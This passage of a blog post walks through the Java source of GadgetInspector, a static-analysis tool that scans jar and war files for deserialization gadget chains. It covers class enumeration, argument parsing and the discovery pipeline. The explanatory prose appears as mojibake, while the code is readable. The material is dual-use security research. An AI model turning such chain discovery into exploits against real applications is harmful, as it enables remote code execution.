classLoader.getResourceAsStream(resourceName);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> resourceName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿”å›è¿è¡Œæ—¶çš„æ‰€æœ‰ç±»å’ŒæŒ‡å®š java åŒ…ä¸­çš„ç±»ï¼Œè¿™é‡Œçš„è¿è¡Œæ—¶ç±»æŒ‡ JDK ä¸­çš„ç±»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è¿”å› java è¿è¡Œæ—¶çš„ç±»å’ŒæŒ‡å®šçš„ java åŒ…ä¸­çš„ç±»</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Collection&lt;ClassResource&gt; <span class="title">getAllClasses</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// å…ˆåŠ è½½è¿è¡Œæ—¶ç±»ï¼ˆbootstrap classesï¼‰</span></span><br><span class="line">    Collection&lt;ClassResource&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;(getRuntimeClasses());</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ ClassLoader åŠ è½½ç”¨æˆ·æŒ‡å®šçš„ java åŒ…</span></span><br><span class="line">    <span class="keyword">for</span> (ClassPath.ClassInfo classInfo : ClassPath.from(classLoader).getAllClasses()) &#123;</span><br><span class="line">        result.add(<span class="keyword">new</span> ClassLoaderClassResource(classLoader, classInfo.getResourceName()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è¿”å›è¿è¡Œæ—¶çš„ç±»</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Collection&lt;ClassResource&gt; <span class="title">getRuntimeClasses</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// Java8 åŠä»¥å‰çš„è¿è¡Œæ—¶ç±»å¯ä»¥é€šè¿‡è¯»å– rt.jar æ–‡ä»¶è·å–</span></span><br><span class="line">    <span class="comment">// A hacky way to get the current JRE&#x27;s rt.jar. Depending on the class loader, rt.jar may be in the</span></span><br><span class="line">    <span class="comment">// bootstrap classloader so all the JDK classes will be excluded from classpath scanning with this!</span></span><br><span class="line">    <span class="comment">// However, this only works up to Java 8, since after that Java uses some crazy module magic.</span></span><br><span class="line">    URL stringClassUrl = Object.class.getResource(<span class="string">&quot;String.class&quot;</span>);</span><br><span class="line">    URLConnection connection = stringClassUrl.openConnection();</span><br><span class="line">    Collection&lt;ClassResource&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (connection <span class="keyword">instanceof</span> JarURLConnection) &#123;</span><br><span class="line">        URL runtimeUrl = ((JarURLConnection) connection).getJarFileURL();</span><br><span class="line">        URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;runtimeUrl&#125;);</span><br><span class="line">        <span class="keyword">for</span> (ClassPath.ClassInfo classInfo : ClassPath.from(classLoader).getAllClasses()) &#123;</span><br><span class="line">            result.add(<span class="keyword">new</span> ClassLoaderClassResource(classLoader, classInfo.getResourceName()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Java9 åŠä»¥åçš„è¿è¡Œæ—¶ç±»é€šè¿‡ JRT æ–‡ä»¶ç³»ç»Ÿè¯»å–è·¯å¾„ä¸‹çš„ç±»æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">// https://stackoverflow.com/questions/1240387/where-are-the-java-system-packages-stored/53897006#53897006</span></span><br><span class="line">    <span class="comment">// Try finding all the JDK classes using the Java9+ modules method:</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        FileSystem fs = FileSystems.getFileSystem(URI.create(<span class="string">&quot;jrt:/&quot;</span>));</span><br><span class="line">        Files.walk(fs.getPath(<span class="string">&quot;/&quot;</span>)).forEach(p -&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (p.toString().toLowerCase().endsWith(<span class="string">&quot;.class&quot;</span>)) &#123;</span><br><span class="line">                result.add(<span class="keyword">new</span> PathClassResource(p));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ProviderNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// Do nothing; this is expected on versions below Java9</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-GadgetInspector"><a href="#3-GadgetInspector" class="headerlink" title="3. GadgetInspector"></a>3. GadgetInspector</h2><p>ç¨‹åºå…¥å£ <code>main</code>ï¼Œå…ˆåšä¸€äº›å‡†å¤‡å·¥ä½œï¼Œç„¶ååˆ† 5 æ­¥èµ°æŒ–æ˜åˆ©ç”¨é“¾ã€‚</p><p>é¦–å…ˆåˆ¤æ–­å‚æ•°æ˜¯å¦ä¸ºç©ºï¼Œä½¿ç”¨ Gadget Inspector è‡³å°‘è¦æŒ‡å®šä¸€ä¸ªå¾…åˆ†æçš„ java åŒ…ï¼Œè‹¥å‚æ•°ä¸ºç©ºåˆ™æ‰“å°ä½¿ç”¨å¸®åŠ©ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (args.length == <span class="number">0</span>) &#123;</span><br><span class="line">    printUsage();   <span class="comment">// æ‰“å°ä½¿ç”¨å¸®åŠ©</span></span><br><span class="line">    System.exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é…ç½®æ—¥å¿—è¾“å‡ºã€.dat æ–‡ä»¶ä¿ç•™ã€æŒ–æ˜ç±»å‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é…ç½® log4j ç”¨äºè¾“å‡ºæ—¥å¿—</span></span><br><span class="line">configureLogging();</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ˜¯å¦ä¿ç•™æ‰€æœ‰çš„ .dat æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">boolean</span> resume = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æŒ–æ˜ç±»å‹ï¼Œé»˜è®¤ä¸º java åŸç”Ÿåºåˆ—åŒ–</span></span><br><span class="line">GIConfig config = ConfigRepository.getConfig(<span class="string">&quot;jserial&quot;</span>);    <span class="comment">// å®ç° SerializableDeciderã€ImplementationFinderã€SourceDiscovery</span></span><br></pre></td></tr></table></figure><p>è§£æå‚æ•°ï¼Œå¯é€‰å‚æ•°åŒ…æ‹¬ï¼š</p><ul><li><code>--resume</code>ï¼šæ˜¯å¦ä¿ç•™æ–‡ä»¶ï¼Œé»˜è®¤ä¸ä¿ç•™</li><li><code>--config xxx</code>ï¼šæŒ‡å®šæŒ–æ˜ç±»å‹ï¼Œé»˜è®¤ Java åŸç”Ÿåºåˆ—åŒ– <code>jserial</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> argIndex = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (argIndex &lt; args.length) &#123;</span><br><span class="line">    String arg = args[argIndex];</span><br><span class="line">    <span class="keyword">if</span> (!arg.startsWith(<span class="string">&quot;--&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (arg.equals(<span class="string">&quot;--resume&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// ä¿ç•™ .dat æ–‡ä»¶</span></span><br><span class="line">        resume = <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (arg.equals(<span class="string">&quot;--config&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// æŒ‡å®šæŒ–æ˜ç±»å‹</span></span><br><span class="line">        config = ConfigRepository.getConfig(args[++argIndex]);</span><br><span class="line">        <span class="keyword">if</span> (config == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Invalid config name: &quot;</span> + args[argIndex]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Unexpected argument: &quot;</span> + arg);</span><br><span class="line">    &#125;</span><br><span class="line">    argIndex += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®å‚æ•°è¯»å– war åŒ…æˆ– jar åŒ…ï¼Œå¯ä»¥æŒ‡å®š 1 ä¸ª war åŒ…æˆ–å¤šä¸ª jar åŒ…ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®é™…ä¸Šæ˜¯ URLClassLoader</span></span><br><span class="line"><span class="keyword">final</span> ClassLoader classLoader;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¹æŒ‡å®šæ–‡ä»¶æ ¹æ® warã€spring-boot jarã€æ™®é€š jar åŒ…çš„æ–¹å¼è½½å…¥å¯¹äºå­—èŠ‚ç æ–‡ä»¶ï¼Œå¹¶è¿”å› URLClassLoader</span></span><br><span class="line"><span class="keyword">if</span> (args.length == argIndex + <span class="number">1</span> &amp;&amp; args[argIndex].toLowerCase().endsWith(<span class="string">&quot;.war&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// æ„é€  war æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">    Path path = Paths.get(args[argIndex]);</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Using WAR classpath: &quot;</span> + path);</span><br><span class="line">    <span class="comment">// å®ç°ä¸º URLClassLoaderï¼ŒåŠ è½½ war åŒ…ä¸‹çš„ WEB-INF/lib å’Œ WEB-INF/classes</span></span><br><span class="line">    classLoader = Util.getWarClassLoader(path);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// æ„é€  jar æ–‡ä»¶è·¯å¾„ï¼Œå¯é…ç½®å¤šä¸ª</span></span><br><span class="line">    <span class="keyword">final</span> Path[] jarPaths = <span class="keyword">new</span> Path[args.length - argIndex];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; args.length - argIndex; i++) &#123;</span><br><span class="line">        Path path = Paths.get(args[argIndex + i]).toAbsolutePath();</span><br><span class="line">        <span class="keyword">if</span> (!Files.exists(path)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Invalid jar path: &quot;</span> + path);</span><br><span class="line">        &#125;</span><br><span class="line">        jarPaths[i] = path;</span><br><span class="line">    &#125;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Using classpath: &quot;</span> + Arrays.toString(jarPaths));</span><br><span class="line">    <span class="comment">// å®ç°ä¸º URLClassLoaderï¼ŒåŠ è½½æ‰€æœ‰æŒ‡å®šçš„ jar</span></span><br><span class="line">    classLoader = Util.getJarClassLoader(jarPaths);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸Šé¢å¾—åˆ°çš„ ClassLoader åˆå§‹åŒ–ç±»æšä¸¾åŠ è½½å™¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator = <span class="keyword">new</span> ClassResourceEnumerator(classLoader);</span><br></pre></td></tr></table></figure><p>æ ¹æ® <code>resume</code> å˜é‡çš„å€¼å†³å®šæ˜¯å¦åˆ é™¤ .dat æ–‡ä»¶ï¼ŒæŒ–æ˜åˆ°çš„åˆ©ç”¨é“¾å­˜å‚¨åœ¨ gadget-chains.txt ä¸­ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!resume) &#123;</span><br><span class="line">    <span class="comment">// Delete all existing dat files</span></span><br><span class="line">    LOGGER.info(<span class="string">&quot;Deleting stale data...&quot;</span>);</span><br><span class="line">    <span class="comment">// æŒ–æ˜åˆ°çš„åˆ©ç”¨é“¾å­˜å‚¨åœ¨ gadget-chains.txt ä¸­ï¼Œä¸åˆ é™¤</span></span><br><span class="line">    <span class="keyword">for</span> (String datFile : Arrays.asList(<span class="string">&quot;classes.dat&quot;</span>, <span class="string">&quot;methods.dat&quot;</span>, <span class="string">&quot;inheritanceMap.dat&quot;</span>,</span><br><span class="line">            <span class="string">&quot;passthrough.dat&quot;</span>, <span class="string">&quot;callgraph.dat&quot;</span>, <span class="string">&quot;sources.dat&quot;</span>, <span class="string">&quot;methodimpl.dat&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">final</span> Path path = Paths.get(datFile);</span><br><span class="line">        <span class="keyword">if</span> (Files.exists(path)) &#123;</span><br><span class="line">            Files.delete(path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŒ–æ˜è¿‡ç¨‹ä¸­åˆ¤æ–­æ˜¯å¦å­˜åœ¨ .dat æ–‡ä»¶ï¼Œæ ¸å¿ƒæ­¥éª¤å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Perform the various discovery steps</span></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;classes.dat&quot;</span>)) || !Files.exists(Paths.get(<span class="string">&quot;methods.dat&quot;</span>))</span><br><span class="line">        || !Files.exists(Paths.get(<span class="string">&quot;inheritanceMap.dat&quot;</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Running method discovery...&quot;</span>);</span><br><span class="line">    MethodDiscovery methodDiscovery = <span class="keyword">new</span> MethodDiscovery();</span><br><span class="line">    methodDiscovery.discover(classResourceEnumerator);</span><br><span class="line">    methodDiscovery.save(); <span class="comment">// ä¿å­˜ç±»ä¿¡æ¯ã€æ–¹æ³•ä¿¡æ¯ã€ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;passthrough.dat&quot;</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Analyzing methods for passthrough dataflow...&quot;</span>);</span><br><span class="line">    PassthroughDiscovery passthroughDiscovery = <span class="keyword">new</span> PassthroughDiscovery();</span><br><span class="line">    passthroughDiscovery.discover(classResourceEnumerator, config);</span><br><span class="line">    passthroughDiscovery.save();    <span class="comment">// ä¿å­˜æ•°æ®æµä¿¡æ¯ï¼ˆæ–¹æ³•å‚æ•°å’Œè¿”å›å€¼çš„å…³ç³»ä¿¡æ¯ï¼‰</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;callgraph.dat&quot;</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Analyzing methods in order to build a call graph...&quot;</span>);</span><br><span class="line">    CallGraphDiscovery callGraphDiscovery = <span class="keyword">new</span> CallGraphDiscovery();</span><br><span class="line">    callGraphDiscovery.discover(classResourceEnumerator, config);</span><br><span class="line">    callGraphDiscovery.save();  <span class="comment">// ä¿å­˜è°ƒç”¨å…³ç³»ä¿¡æ¯ï¼ˆè°ƒç”¨è€…æ–¹æ³•ä¸è¢«è°ƒæ–¹æ³•ä¹‹é—´çš„å‚æ•°ä¼ é€’ï¼‰</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;sources.dat&quot;</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Discovering gadget chain source methods...&quot;</span>);</span><br><span class="line">    SourceDiscovery sourceDiscovery = config.getSourceDiscovery();</span><br><span class="line">    sourceDiscovery.discover();</span><br><span class="line">    sourceDiscovery.save(); <span class="comment">// ä¿å­˜æ±¡ç‚¹æºä¿¡æ¯</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Searching call graph for gadget chains...&quot;</span>);</span><br><span class="line">    GadgetChainDiscovery gadgetChainDiscovery = <span class="keyword">new</span> GadgetChainDiscovery(config);</span><br><span class="line">    gadgetChainDiscovery.discover();    <span class="comment">// ä¿å­˜é‡å†™ä¿¡æ¯ã€åˆ©ç”¨é“¾ä¿¡æ¯</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¸å¿ƒæ­¥éª¤çœ‹èµ·æ¥æœ‰å¤šç®€å•å®é™…å®ç°å°±æœ‰å¤šå¤æ‚ï¼ˆ<del>ä¸æ˜¯</del>ï¼‰ï¼Œä¸‹é¢å°±å±•å¼€æ ¸å¿ƒæ­¥éª¤çš„å†…å®¹ã€‚</p><h2 id="4-MethodDiscovery"><a href="#4-MethodDiscovery" class="headerlink" title="4. MethodDiscovery"></a>4. MethodDiscovery</h2><p><code>discover</code> æ–¹æ³•ä¸»è¦å®Œæˆçš„æ˜¯è¯»å–ç±»æ–‡ä»¶å¹¶åˆ©ç”¨ asm çš„è®¿é—®è€…è®°å½•ç±»ä¿¡æ¯ã€æ–¹æ³•ä¿¡æ¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä½¿ç”¨è®¿é—®è€…è®°å½•ç±»ä¿¡æ¯å’Œæ–¹æ³•ä¿¡æ¯</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classResourceEnumerator ç±»æšä¸¾å™¨</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// éå†æ‰€æœ‰çš„ç±»</span></span><br><span class="line">    <span class="keyword">for</span> (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123;</span><br><span class="line">        <span class="keyword">try</span> (InputStream in = classResource.getInputStream()) &#123; <span class="comment">// è¯»å–ç±»æ–‡ä»¶</span></span><br><span class="line">            ClassReader cr = <span class="keyword">new</span> ClassReader(in);   <span class="comment">// åˆ›å»º ClassReaderï¼Œåç»­è°ƒç”¨ accept æ–¹æ³•è§£æç±»æ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// ç»§æ‰¿ asm çš„ ClassVisitor(MethodVisitor) å®ç°å¯¹ç±»æ–‡ä»¶çš„è§‚å¯Ÿï¼Œè®°å½•ç±»ä¿¡æ¯å’Œæ–¹æ³•ä¿¡æ¯</span></span><br><span class="line">                <span class="comment">// é‡å†™æ–¹æ³•çš„è°ƒç”¨é¡ºåºï¼ˆæ²¡æœ‰é‡å†™çš„è°ƒç”¨é»˜è®¤æ–¹æ³•ï¼‰ï¼švisit -&gt; visitField -&gt; visitMethod -&gt; visitEnd</span></span><br><span class="line">                cr.accept(<span class="keyword">new</span> MethodDiscoveryClassVisitor(), ClassReader.EXPAND_FRAMES);    <span class="comment">// ä»¥æ‰©å±•æ ¼å¼è®¿é—®å †æ ˆæ˜ å°„å¸§</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Exception analyzing: &quot;</span> + classResource.getName(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MethodDiscoveryClassVisitor</code> ç±»ç»§æ‰¿äº† asm ä¸­çš„ ClassVisitorï¼Œé‡å†™äº†å››ä¸ªè®¿é—®è€…æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String name;            <span class="comment">// ç±»çš„å†…éƒ¨åç§°</span></span><br><span class="line"><span class="keyword">private</span> String superName;       <span class="comment">// çˆ¶ç±»çš„å†…éƒ¨åç§°</span></span><br><span class="line"><span class="keyword">private</span> String[] interfaces;    <span class="comment">// ç±»æ¥å£çš„å†…éƒ¨åç§°</span></span><br><span class="line"><span class="keyword">boolean</span> isInterface;            <span class="comment">// æ˜¯å¦ä¸ºæ¥å£</span></span><br><span class="line"><span class="keyword">private</span> List&lt;ClassReference.Member&gt; members;    <span class="comment">// ç±»çš„æ‰€æœ‰å­—æ®µ</span></span><br><span class="line"><span class="keyword">private</span> ClassReference.Handle classHandle;      <span class="comment">// å¼•ç”¨</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">MethodDiscoveryClassVisitor</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(Opcodes.ASM6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visit</code> æ–¹æ³•åœ¨ç±»è®¿é—®çš„å¼€å§‹æ—¶è°ƒç”¨ï¼ˆå³ <code>ClassReader.accept</code> è°ƒç”¨çš„ç¬¬ä¸€ä¸ªè®¿é—®è€…æ–¹æ³•ï¼‰ï¼Œè®°å½•ç±»åã€çˆ¶ç±»åã€æ¥å£åã€æ˜¯å¦ä¸ºæ¥å£ï¼Œåˆ›å»ºåŠ¨æ€æ•°ç»„ç”¨äºåœ¨ <code>visitField</code> ä¸­è®°å½•å­—æ®µä¿¡æ¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">(<span class="keyword">int</span> version, <span class="keyword">int</span> access, String name, String signature, String superName, String[] interfaces)</span> </span>&#123;  <span class="comment">// ç±»è®¿é—®å¼€å§‹ï¼ˆè°ƒç”¨çš„ç¬¬ä¸€ä¸ªæ–¹æ³•ï¼‰</span></span><br><span class="line">    <span class="comment">// è®°å½•ç±»ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.superName = superName;</span><br><span class="line">    <span class="keyword">this</span>.interfaces = interfaces;</span><br><span class="line">    <span class="keyword">this</span>.isInterface = (access &amp; Opcodes.ACC_INTERFACE) != <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.members = <span class="keyword">new</span> ArrayList&lt;&gt;();   <span class="comment">// å­—æ®µä¿¡æ¯ï¼ˆæˆå‘˜ï¼‰</span></span><br><span class="line">    <span class="keyword">this</span>.classHandle = <span class="keyword">new</span> ClassReference.Handle(name); <span class="comment">// å½“å‰ç±»</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨çˆ¶ç±»æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">super</span>.visit(version, access, name, signature, superName, interfaces);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitField</code> æ–¹æ³•ç”¨äºè®°å½•ç±»çš„å­—æ®µä¿¡æ¯ï¼ŒåŒ…æ‹¬åç§°ã€è®¿é—®æ ‡å¿—ã€ç±»å‹ï¼Œæ ¹æ®è®¿é—®æ ‡å¿— <code>access</code> åˆ¤æ–­æ˜¯å¦ä¸ºé™æ€å˜é‡ï¼Œå› ä¸ºé™æ€å˜é‡ä¸å¯æ§æ‰€ä»¥ä¸å½“ä½œå¯èƒ½çš„æ±¡ç‚¹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 